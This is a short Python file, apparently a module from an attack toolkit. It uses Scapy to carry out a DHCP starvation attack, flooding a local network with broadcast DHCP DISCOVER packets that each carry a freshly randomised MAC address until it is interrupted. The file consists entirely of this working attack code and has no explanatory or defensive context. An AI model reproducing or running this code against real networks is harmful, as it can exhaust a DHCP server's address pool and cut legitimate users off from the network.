# -*- coding: utf-8 -*-

from scapy.all import Ether, RandMAC, sendp
from scapy.layers.inet import IP, UDP
from scapy.layers.dhcp import BOOTP, DHCP


# --------------------------------------------------------------------------
#
# --------------------------------------------------------------------------

def run(interface):

    if len(interface) > 0:
        inter = str(interface[0])

        try:
            while 1:
                src_mac = str(RandMAC())
                ethernet = Ether(dst='ff:ff:ff:ff:ff:ff', src=src_mac, type=0x800)
                ip = IP(src="0.0.0.0", dst="255.255.255.255")
                udp = UDP(sport=68, dport=67)
                bootps = BOOTP(chaddr=src_mac, ciaddr='0.0.0.0', xid=0x01020304, flags=1)
                dhcps = DHCP(options=[("message-type", "discover"), "end"])
                packet = ethernet / ip / udp / bootps / dhcps
                sendp(packet, iface=inter, verbose=0)
        except KeyboardInterrupt:
            pass


def run_attack(config):
    run(config.interface)

